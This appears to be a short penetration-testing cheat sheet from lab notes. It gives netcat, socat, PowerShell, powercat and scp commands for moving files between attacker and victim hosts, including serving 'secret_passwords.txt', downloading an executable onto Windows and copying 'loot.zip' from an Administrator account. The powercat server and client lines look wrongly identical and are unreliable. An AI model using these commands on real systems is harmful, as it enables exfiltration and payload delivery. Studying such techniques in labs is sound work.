---
  title: "File transfering"
---

# Netcat
Server side
`nc -nlvp 4444 > incoming.exe`

Client side
`nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe`

# Socat
Server side
`socat TCP4-LISTEN:443,fork file:secret_passwords.txt`

Client side
`socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create`

# Powershell
Download on client side
`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"`

# Powercat
Server
`powercat -c IP -p PORT -i FILE.TXT`

Client
`powercat -c IP -p PORT -i C:\Users\Offsec\powercat.ps1`

# SCP
`scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2`

Example
`scp Administrator@10.10.216.187:/C:/Users/Administrator/Downloads/20211003055235_loot.zip loot.zip`
